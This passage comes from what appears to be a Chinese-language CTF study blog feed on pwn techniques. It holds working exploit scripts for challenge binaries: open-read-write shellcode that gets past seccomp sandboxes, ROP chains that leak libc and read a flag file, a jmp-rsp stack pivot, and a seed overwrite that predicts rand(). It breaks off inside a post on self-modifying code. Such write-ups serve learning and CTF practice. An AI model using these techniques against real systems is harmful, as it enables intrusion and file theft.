<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#0x67616c66根据文件名改动 0x67616c66转ASCII--&gt;flag</span><br><span class="line">shellcode=asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)</span><br></pre></td></tr></table></figure>

<p>具体解释一下这个汇编代码,根据上面对open，read，write函数的了解，汇编也就很好理解了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#fd = open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">push 0x0               ; 将0压栈，表示以只读方式打开文件（O_RDONLY）</span><br><span class="line">push 0x67616c66        ; 将&quot;flag&quot;字符串的ASCII值压栈（注意字节顺序是反的，实际上是&#x27;flag&#x27;）</span><br><span class="line">mov ebx, esp           ; 将栈顶指针赋值给ebx，作为文件名指针</span><br><span class="line">xor ecx, ecx           ; 清空ecx寄存器（第二个参数，O_RDONLY）</span><br><span class="line">xor edx, edx           ; 清空edx寄存器（第三个参数，权限模式，这里不需要）</span><br><span class="line">mov eax, 0x5           ; 调用sys_open (系统调用号5)</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x3           ; 调用sys_read (系统调用号3)</span><br><span class="line">mov ecx, ebx           ; 文件描述符（由上一步返回值在ebx中）</span><br><span class="line">xor ebx, ebx           ; 清空ebx，作为文件描述符0（标准输入）</span><br><span class="line">mov edx, 0x100         ; 读取长度为256字节</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x4           ; 调用sys_write (系统调用号4)</span><br><span class="line">xor ebx, ebx           ; 清空ebx，作为文件描述符1（标准输出）</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>

<p>还可以通过传参传入flag的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#fd = open(&#x27;home/pwn/flag&#x27;,0) 0x804a094根据具体情况而定</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;&#x27; xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read(fd,0x804a094,0x20) </span></span><br><span class="line">s += <span class="string">&#x27;&#x27;&#x27; mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write(1,0x804a094,0x20) </span></span><br><span class="line">s += <span class="string">&#x27;&#x27;&#x27; mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(s)+<span class="string">b&#x27;/home/pwn/flag\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>第二种直接利用pwntools</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)        <span class="comment"># Open &#x27;flag&#x27; (fd returned in EAX)</span></span><br><span class="line">payload += shellcraft.read(<span class="number">3</span>, <span class="number">0x804a090</span>, <span class="number">0x100</span>)  <span class="comment"># Read from opened FD</span></span><br><span class="line">payload += shellcraft.write(<span class="number">1</span>, <span class="number">0x804a090</span>, <span class="number">0x100</span>)     <span class="comment"># Write to stdout (FD 1)</span></span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line"><span class="comment">#不知道为什么没打通理论上是可以的</span></span><br></pre></td></tr></table></figure>



<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png" alt="2"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h5 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h5><p>例题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  gift();</span><br><span class="line">  init_sandbox();</span><br><span class="line">  sandboxx();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sandboxx</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the Sandbox Challenge&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you need an open read wirte &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you a nice little gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Leak: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./sandbox&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./sandbox&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">         gdb.attach(p)</span><br><span class="line">         pause()</span><br><span class="line">        </span><br><span class="line">bss=<span class="number">0x404020</span>+<span class="number">0x800</span></span><br><span class="line">sandboxx = <span class="number">0x4013ED</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi=libc_base+<span class="number">0x0000000000023b6a</span> </span><br><span class="line">rsi=libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119431</span></span><br><span class="line">rsp = libc_base + <span class="number">0x000000000002f70a</span></span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_addr)+p64(rsp)+p64(bss + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;name:&quot;</span>)</span><br><span class="line">p.send(payload2) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  =<span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(bss)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(<span class="number">3</span>)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(bss+<span class="number">0x600</span>)</span><br><span class="line">payload +=p64(rdx_r12)</span><br><span class="line">payload +=p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">payload +=p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(<span class="number">1</span>)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(bss+<span class="number">0x600</span>)</span><br><span class="line">payload +=p64(rdx_r12)</span><br><span class="line">payload +=p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">payload +=p64(write_addr) </span><br><span class="line">payload +=p64(sandboxx )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<p>江西省赛</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;&quot;</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x19f2)</span></span><br><span class="line"><span class="string">set debug-file-directory /home/zacsn/.config/cpwn/pkgs/2.31-</span></span><br><span class="line"><span class="string">0ubuntu9.17/amd64/libc6-dbg_2.31-0ubuntu9.17_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/zacsn/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/glibcsource_2.31-0ubuntu9.17_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line">rn = <span class="keyword">lambda</span> counts : io.recvn(counts)</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"><span class="comment">#gdb.debug(elf.path,gdbscript=gs)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript = gs)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013d3</span></span><br><span class="line">ru(<span class="string">b&quot;hello sandbox!&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x4012f9</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">puts_addr = u64(rn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">lg(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_addr&quot;</span>)</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x0000000000142c92</span></span><br><span class="line">pop_rax = libc_addr + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall = libc_addr+libc.search(asm(<span class="string">&quot;&quot;&quot;syscall;ret&quot;&quot;&quot;</span>)).__next__()</span><br><span class="line">bss_addr = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;hello sandbox!&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(<span class="number">0x10</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(bss_addr + <span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(bss_addr + <span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&quot;./flag\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>今天先写到这✍️，以后还会接着写📖，但是明天就要开始着手学堆了🔥，不然很多比赛都打不了🏆💪。</p>
<h2 id="ctfshow-pwn69"><a href="#ctfshow-pwn69" class="headerlink" title="ctfshow pwn69"></a>ctfshow pwn69</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>可以看到orw是可以的，所以我们要先利用read将orw读到</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27;28191&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br><span class="line"></span><br><span class="line">jmp_rsp_addr = <span class="number">0x400a01</span></span><br><span class="line">buf_shellcode = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) + asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;do&#x27;</span>)</span><br><span class="line">p.sendline(buf_shellcode)</span><br><span class="line">p.sendline(orw_shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这一部分是标准的orw</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br></pre></td></tr></table></figure>

<p>这部分我来详细解释一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf_shellcode = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) + asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br></pre></td></tr></table></figure>

<p> asm(shellcraft.read(0,mmap,100)):这是汇编代码，用于调用read系统调用，从标准输入读取最多100字节的数据到地址0x123000。</p>
<p>asm(“mov rax,0x123000; jmp rax”)：先将0x123000放入rax，然后jmp rax执行shellcode,为什么是sellcode呢等下再说。</p>
<p>p64(jmp_rsp_addr)：将返回地址覆盖成jmp rsp,此时程序跳转到 <code>rsp</code> 指向的位置,即 <code>asm(&quot;sub rsp, 0x30; jmp rsp&quot;)</code>因为pop ebp后rsp</p>
<p>增高0x08。</p>
<p>asm(“sub rsp,0x30; jmp rsp”):sub rsp,0x30使得rsp减0x30到达了buf的起始位置，jmp rsp就开始执行了。</p>
<p>然后我来看看整个流程。</p>
<p>p.sendline(buf_shellcode)后,栈上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read(0,mmap,100)</span><br><span class="line">buf_shellcode.ljust(0x28,b&#x27;\x00&#x27;)</span><br><span class="line">p64(jmp_rsp_addr)   # return_addr</span><br><span class="line">asm(&quot;sub rsp,0x30; jmp rsp&quot;)</span><br></pre></td></tr></table></figure>

<p>有第二部分的分析我们知道rsp此时已经达到buf的起始位置开始执行read了，所以我们才有第二次send。</p>
<p>我们把标准的orw输入后，同理rsp又会回到起始位置开始执行orw，最终得到flag。</p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>sandbox</category>
      </categories>
  </entry>
  <entry>
    <title>seed的覆盖</title>
    <url>/2025/03/25/seed%E7%9A%84%E8%A6%86%E7%9B%96/</url>
    <content><![CDATA[<p>这里主要记一下seed的覆盖，srand(seed);v2 &#x3D; rand() % 6 + 1;其中rand的生成是依靠seed的，我们只要找到seed与输入值之间的偏移将seed修改为我们想要的值，就可以预测rand的生成</p>
<p>这是攻防世界dice_game的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="string">&#x27;57464&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload=<span class="number">0x40</span>*<span class="string">b&quot;a&quot;</span>+p64(<span class="number">0</span>)  <span class="comment">#buf与seed的偏移是0x40</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">	a.append(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.recv()</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>smc</title>
    <url>/2025/07/28/smc/</url>
    <content><![CDATA[<p>wuuu,上次烽火杯的smc没写出来，这次的nepctf的smc也没写出了，所以打算总结一下smc，并且以后碰到smc都往这个blog里面放了。</p>
<p>简述一下原理:</p>
<p>在CTF逆向工程中，<strong>SMC（Self-Modifying Code，自修改代码）</strong> 是一种常见的反分析技术。其核心原理是<strong>程序在运行时动态修改自身的指令代码</strong>，使得静态分析工具（如IDA Pro）无法直接获取完整的可执行逻辑，从而增加逆向难度。</p>
<p>感觉smc根本就不难，动调一下基本都可以解决，但是难在有些反调试等方面感觉只单出smc的没见过。</p>
<p>话不多说直接上例题，我目前写过的smc有：NepCTF的realme，[网鼎杯 2020 青龙组]jocker，[SCTF2019]creakme，和烽火杯的smc</p>
<p>今天一天可能写不完四个，慢慢写吧，就按这个顺序来写。</p>
<h2 id="NepCTF-realme"><a href="#NepCTF-realme" class="headerlink" title="NepCTF realme"></a>NepCTF realme</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-104h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-104h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41200F);</span><br><span class="line">  qmemcpy(v7, <span class="string">&quot;PY&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">-94</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">-108</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">46</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="number">-114</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="number">92</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="number">-107</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = <span class="number">121</span>;</span><br><span class="line">  v7[<span class="number">9</span>] = <span class="number">22</span>;</span><br><span class="line">  v7[<span class="number">10</span>] = <span class="number">-27</span>;</span><br><span class="line">  v7[<span class="number">11</span>] = <span class="number">54</span>;</span><br><span class="line">  v7[<span class="number">12</span>] = <span class="number">96</span>;</span><br><span class="line">  v7[<span class="number">13</span>] = <span class="number">-57</span>;</span><br><span class="line">  v7[<span class="number">14</span>] = <span class="number">-24</span>;</span><br><span class="line">  v7[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">  v7[<span class="number">16</span>] = <span class="number">51</span>;</span><br><span class="line">  v7[<span class="number">17</span>] = <span class="number">120</span>;</span><br><span class="line">  v7[<span class="number">18</span>] = <span class="number">-16</span>;</span><br><span class="line">  v7[<span class="number">19</span>] = <span class="number">-48</span>;</span><br><span class="line">  v7[<span class="number">20</span>] = <span class="number">54</span>;</span><br><span class="line">  v7[<span class="number">21</span>] = <span class="number">-56</span>;</span><br><span class="line">  v7[<span class="number">22</span>] = <span class="number">115</span>;</span><br><span class="line">  v7[<span class="number">23</span>] = <span class="number">27</span>;</span><br><span class="line">  v7[<span class="number">24</span>] = <span class="number">101</span>;</span><br><span class="line">  v7[<span class="number">25</span>] = <span class="number">64</span>;</span><br><span class="line">  v7[<span class="number">26</span>] = <span class="number">-75</span>;</span><br><span class="line">  v7[<span class="number">27</span>] = <span class="number">-44</span>;</span><br><span class="line">  v7[<span class="number">28</span>] = <span class="number">-24</span>;</span><br><span class="line">  v7[<span class="number">29</span>] = <span class="number">-100</span>;</span><br><span class="line">  v7[<span class="number">30</span>] = <span 